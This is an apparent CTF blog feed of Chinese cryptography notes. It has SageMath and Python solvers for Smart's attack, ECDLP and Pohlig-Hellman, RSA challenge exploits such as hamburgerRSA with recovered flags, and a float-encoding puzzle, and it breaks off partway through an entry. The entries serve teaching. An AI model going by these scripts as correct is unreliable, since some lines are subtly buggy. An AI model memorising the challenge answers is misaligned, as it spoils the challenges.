      <url>/2023/01/15/ECC%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<p>参考la佬博客   Lazzaro @ <a href="https://lazzzaro.github.io/">https://lazzzaro.github.io</a></p><p>椭圆曲线的定义式：y2+axy+by&#x3D;x3+cx2+dx+e</p><p>一般方程：y2+a1xy+a3y&#x3D;x3+a2x2+a4x+a6</p><p>最常用方程（维尔斯特拉斯标准形式）</p><p>y2&#x3D;x3+ax+b</p><h2 id="Smart’s-attack"><a href="#Smart’s-attack" class="headerlink" title="Smart’s attack"></a>Smart’s attack</h2><p>适用情况：E.order()&#x3D;pE.order()&#x3D;p。</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">p &#x3D; A &#x3D; B &#x3D; E &#x3D; EllipticCurve(GF(p),[A,B])P &#x3D; E(,)Q &#x3D; E(,)def SmartAttack(P,Q,p):    E &#x3D; P.curve()    Eqp &#x3D; EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])    P_Qps &#x3D; Eqp.lift_x(ZZ(P.xy()[0]), all&#x3D;True)    for P_Qp in P_Qps:        if GF(p)(P_Qp.xy()[1]) &#x3D;&#x3D; P.xy()[1]:            break    Q_Qps &#x3D; Eqp.lift_x(ZZ(Q.xy()[0]), all&#x3D;True)    for Q_Qp in Q_Qps:        if GF(p)(Q_Qp.xy()[1]) &#x3D;&#x3D; Q.xy()[1]:            break    p_times_P &#x3D; p*P_Qp    p_times_Q &#x3D; p*Q_Qp    x_P,y_P &#x3D; p_times_P.xy()    x_Q,y_Q &#x3D; p_times_Q.xy()    phi_P &#x3D; -(x_P&#x2F;y_P)    phi_Q &#x3D; -(x_Q&#x2F;y_Q)    k &#x3D; phi_Q&#x2F;phi_P    return ZZ(k)r &#x3D; SmartAttack(P, Q, p)print(r)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ECDLP"><a href="#ECDLP" class="headerlink" title="ECDLP"></a>ECDLP</h2><p>CDLP即椭圆曲线上的离散对数问题（The Elliptic Curve Discrete Logarithm Problem）。</p><p>椭圆曲线上离散对数问题ECDLP定义如下：给定素数 pp 和椭圆曲线 EE，对 Q&#x3D;kPQ&#x3D;kP，在已知 P,QP,Q 的情况下求出小于 pp 的正整数 kk。可以证明由 kk 和 PP 计算 QQ 比较容易，而由 QQ 和 PP 计算 kk 则比较困难。将椭圆曲线中的加法运算与离散对数中的模乘运算相对应，将椭圆曲线中的乘法运算与离散对数中的模幂运算相对应，我们就可以建立基于椭圆曲线的对应的密码体制。</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">#Sage Code 1p &#x3D; a &#x3D; b &#x3D; E &#x3D; EllipticCurve(GF(p),[a,b])P &#x3D; E(, ) Q &#x3D; E(, ) k &#x3D; discrete_log(Q, P, operation&#x3D;&#39;+&#39;) print(k)#Sage Code 2p &#x3D; a &#x3D; b &#x3D; E &#x3D; EllipticCurve(GF(p),[a,b])P &#x3D; E(, ) Q &#x3D; E(, ) k &#x3D; P.discrete_log(Q)print(k)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Pohlig-Hellman算法"><a href="#Pohlig-Hellman算法" class="headerlink" title="Pohlig-Hellman算法"></a>Pohlig-Hellman算法</h2><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">#Sage Code 1p &#x3D; a &#x3D; b &#x3D; gx &#x3D; gy &#x3D; px &#x3D; py &#x3D; E &#x3D; EllipticCurve(GF(p), [a, b])G &#x3D; E(gx, gy)n &#x3D; E.order()QA &#x3D; E(px, py)factors &#x3D; list(factor(n))m &#x3D; 1moduli &#x3D; []remainders &#x3D; []print(f&quot;[+] Running Pohlig Hellman&quot;)print(factors)for i, j in factors:    if i &gt; 10**9:        print(i)        break    mod &#x3D; i**j    g2 &#x3D; G*(n&#x2F;&#x2F;mod)    q2 &#x3D; QA*(n&#x2F;&#x2F;mod)    r &#x3D; discrete_log(q2, g2, operation&#x3D;&#39;+&#39;)    remainders.append(r)    moduli.append(mod)    m *&#x3D; modr &#x3D; crt(remainders, moduli)print(r)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">#Sage Code 2E &#x3D; EllipticCurve(GF(p), [a, b])P &#x3D; E()Q &#x3D; E()factors, exponents &#x3D; zip(*factor(E.order()))primes &#x3D; [factors[i] ^ exponents[i] for i in range(len(factors))][:-2]print(primes)dlogs &#x3D; []for fac in primes:t &#x3D; int(int(P.order()) &#x2F;&#x2F; int(fac))dlog &#x3D; discrete_log(t*Q,t*P,operation&#x3D;&quot;+&quot;)dlogs +&#x3D; [dlog]print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog)) #calculates discrete logarithm for each prime orderl &#x3D; crt(dlogs,primes)print(l)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> ECC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据在内存中的存储形式</title>
      <link href="/2023/01/15/%E6%95%B0%E6%8D%AE%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%AD%98%E5%82%A8%E5%BD%A2%E5%BC%8F/"/>
      <url>/2023/01/15/%E6%95%B0%E6%8D%AE%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%AD%98%E5%82%A8%E5%BD%A2%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">C语言</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"afctf&#123;sec_is_everywhere&#125;"</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%20f\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> structs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">72065910510177138000000000000000.000000</span><span class="token punctuation">,</span><span class="token number">71863209670811371000000.000000</span><span class="token punctuation">,</span><span class="token number">18489682625412760000000000000000.000000</span><span class="token punctuation">,</span><span class="token number">72723257588050687000000.000000</span><span class="token punctuation">,</span><span class="token number">4674659167469766200000000.000000</span><span class="token punctuation">,</span><span class="token number">19061698837499292000000000000000000000.000000</span><span class="token punctuation">]</span>a <span class="token operator">=</span> <span class="token string">''</span>b <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    a <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;f'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">#小端</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    b <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>f'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">#大端</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">0x61666374667b7365635f69735f657665727977686572657d</span>b <span class="token operator">=</span> <span class="token number">0x7d6572657d6572657d6572657d6572657d6572657d657265</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公钥解析</title>
      <link href="/2023/01/15/%E5%85%AC%E9%92%A5%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/01/15/%E5%85%AC%E9%92%A5%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="公钥解析（flag-enc是base64）"><a href="#公钥解析（flag-enc是base64）" class="headerlink" title="公钥解析（flag.enc是base64）"></a>公钥解析（flag.enc是base64）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decodec0 <span class="token operator">=</span> <span class="token string">'GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA=='</span>n <span class="token operator">=</span> <span class="token number">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span>e <span class="token operator">=</span> <span class="token number">65537</span>d<span class="token operator">=</span><span class="token number">406853230956379689450620815713768871010712825839536410687962650677800895818003893712259622281477453292088146173840036827322518131453630576229976208523593618949818777897059256426591560532784635697190752924923710375949616954069804342573867253630978123632384795587951365482103468722384133084798614863870775897915929475258974188300927376911833763105616386167881813301748585233563049693794370642976326692672223638908164822104832415788577945314264232531947860576966629150456995512932232264881080618006698700677529111454508900582785420549466798020451488168615035256292977390692401388790460066327347700109341639992159475755036449</span>p <span class="token operator">=</span> <span class="token number">3133337</span>q <span class="token operator">=</span> <span class="token number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span>key_info <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>key_info<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span>c <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>c0<span class="token punctuation">)</span>flag <span class="token operator">=</span> key<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字当作字符串连在一起</title>
      <link href="/2023/01/15/%E6%95%B0%E5%8F%AA%E5%BD%93%E4%BD%9C%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E5%9C%A8%E4%B8%80%E8%B5%B7/"/>
      <url>/2023/01/15/%E6%95%B0%E5%8F%AA%E5%BD%93%E4%BD%9C%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E5%9C%A8%E4%B8%80%E8%B5%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="例题-MTCTF-2021-hamburgerRSA"><a href="#例题-MTCTF-2021-hamburgerRSA" class="headerlink" title="例题[MTCTF 2021]hamburgerRSA"></a>例题[MTCTF 2021]hamburgerRSA</h3><p><a href="https://blog.csdn.net/qq_51999772/article/details/121906311?ops_request_misc=&request_id=&biz_id=102&utm_term=%5BMTCTF%202021%5DhamburgerRSA&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-121906311.142%5Ev68%5Ejs_top,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&spm=1018.2226.3001.4187">参考文档</a></p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>nbit <span class="token operator">=</span> <span class="token number">64</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">,</span> q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>nbit<span class="token punctuation">)</span><span class="token punctuation">,</span> getPrime<span class="token punctuation">(</span>nbit<span class="token punctuation">)</span>    PP <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    QQ <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>PP<span class="token punctuation">)</span> <span class="token keyword">and</span> isPrime<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>n <span class="token operator">=</span> PP <span class="token operator">*</span> QQm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token number">177269125756508652546242326065138402971542751112423326033880862868822164234452280738170245589798474033047460920552550018968571267978283756742722231922451193</span>c <span class="token operator">=</span> <span class="token number">47718022601324543399078395957095083753201631332808949406927091589044837556469300807728484035581447960954603540348152501053100067139486887367207461593404096</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="exp-sage"><a href="#exp-sage" class="headerlink" title="exp  sage"></a>exp  sage</h4><p>先判断一下p,q位数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> p<span class="token operator">*</span>q    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">nbit <span class="token operator">=</span> <span class="token number">64</span>n <span class="token operator">=</span> <span class="token number">177269125756508652546242326065138402971542751112423326033880862868822164234452280738170245589798474033047460920552550018968571267978283756742722231922451193</span>high <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">]</span>low <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pq <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>high <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> low<span class="token punctuation">)</span>        f <span class="token operator">=</span> factor<span class="token punctuation">(</span>pq<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">and</span> f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">64</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            q <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2p<span class="token punctuation">,</span>q <span class="token operator">=</span> <span class="token number">9788542938580474429</span><span class="token punctuation">,</span><span class="token number">18109858317913867117</span>c <span class="token operator">=</span> <span class="token number">47718022601324543399078395957095083753201631332808949406927091589044837556469300807728484035581447960954603540348152501053100067139486887367207461593404096</span>e <span class="token operator">=</span> <span class="token number">65537</span>PP <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>QQ <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>fai_n <span class="token operator">=</span> <span class="token punctuation">(</span>PP<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>QQ<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>fai_n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>PP<span class="token operator">*</span>QQ<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#flag&#123;f8d8bfa5-6c7f-14cb-908b-abc1e96946c6&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="黑盾杯-2020-Change"><a href="#黑盾杯-2020-Change" class="headerlink" title="[黑盾杯 2020]Change"></a>[黑盾杯 2020]Change</h3><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> FLAG<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> random<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">399</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">400</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"enc"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token 